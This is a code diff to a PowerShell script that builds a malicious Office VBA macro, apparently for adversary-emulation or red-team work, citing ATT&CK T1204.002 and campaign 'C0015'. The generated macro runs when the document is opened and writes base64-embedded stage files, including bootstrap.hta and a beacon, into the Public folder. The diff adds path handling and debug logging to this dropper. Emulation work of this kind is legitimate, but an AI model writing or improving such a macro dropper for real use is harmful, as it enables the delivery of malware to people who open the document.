@@ -31,7 +31,10 @@ $repo = (Get-Item (Join-Path $PSScriptRoot '..\..')).FullName
 
 function Load-B64 {
     param([string]$Rel)
-    $p = Join-Path $repo $Rel
+    # accept relative (repo-rooted) or absolute input; Join-Path doubles the root
+    # when the child is already rooted, so resolve explicitly.
+    $p = if ([System.IO.Path]::IsPathRooted($Rel)) { $Rel }
+         else { Join-Path $repo $Rel }
     if (-not (Test-Path -LiteralPath $p)) { throw "missing input: $Rel" }
     return [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($p))
 }
@@ -70,12 +73,16 @@ $all.Add('')
 $all.Add("' -------- write stage files at open (S1 delivery, T1204.002) --------")
 $all.Add(@'
 Private Sub WriteFiles()
-    On Error GoTo Done
+    On Error GoTo Fail
     Dim fso As Object
     Set fso = CreateObject("Scripting.FileSystemObject")
     Dim d As String
     d = Environ("PUBLIC") & "\C0015"
     If Not fso.FolderExists(d) Then fso.CreateFolder d
+    Dim t0 As Object
+    Set t0 = fso.CreateTextFile(d & "\macro_ran.txt", True, True)
+    t0.WriteLine "macro entered"
+    t0.Close
     Dim names(2) As String, blobs(2) As String
     names(0) = "config.ini":          blobs(0) = CFG_B64
     names(1) = "bootstrap.hta":       blobs(1) = HTA_B64
@@ -94,14 +101,21 @@ Private Sub WriteFiles()
         st.SaveToFile d & "\" & names(i), 2
         st.Close
     Next i
-Done:
+    Exit Sub
+Fail:
+    On Error Resume Next
+    Dim f1 As Object, t1 As Object
+    Set f1 = CreateObject("Scripting.FileSystemObject")
+    Set t1 = f1.CreateTextFile(Environ("PUBLIC") & "\C0015\writefiles_err.txt", True, True)
+    t1.WriteLine "WriteFiles err " & Err.Number & " " & Err.Description & " at " & i
+    t1.Close
 End Sub
 '@)
 # ---- inject WriteFiles call at the top of RunEntry ----
 $tpl = $tpl -replace '(?m)^Private Sub RunEntry\(\)\s*$', "Private Sub RunEntry()`r`n    WriteFiles   ' v2: no pre-staged files - macro creates config/hta/beacon"
 $tpl = $tpl.TrimEnd() + "`r`n`r`n" + ($all -join "`r`n") + "`r`n"
 
-$out = Join-Path $repo $OutPath
+$out = if ([System.IO.Path]::IsPathRooted($OutPath)) { $OutPath } else { Join-Path $repo $OutPath }
 New-Item -ItemType Directory -Force -Path (Split-Path $out -Parent) | Out-Null
 Set-Content -LiteralPath $out -Value $tpl -Encoding UTF8
 Write-Output "generated: $out"
